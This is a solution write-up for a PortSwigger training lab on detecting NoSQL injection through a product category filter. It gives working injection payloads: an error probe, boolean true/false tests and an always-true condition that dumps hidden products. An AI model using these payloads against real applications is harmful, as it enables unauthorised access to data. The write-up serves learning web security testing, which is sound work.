# Lab 01 — Detecting NoSQL injection

> **Apprentice** · [Official lab](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection)

**Entry point:** `GET /filter?category=` — the value is concatenated into a
server-side Mongo/JS query.

## Solution

1. `'` → JavaScript syntax error → injection surface.
2. Valid JS: `Gifts'+''` → no error (server-side injection confirmed).
3. Boolean probes:

```
Gifts' && 0 && 'x     → no products   (false)
Gifts' && 1 && 'x     → Gifts products (true)
```

4. Always-true condition dumps everything:

```
Gifts'||1||'
```

The response now includes **unreleased** products — lab solved.
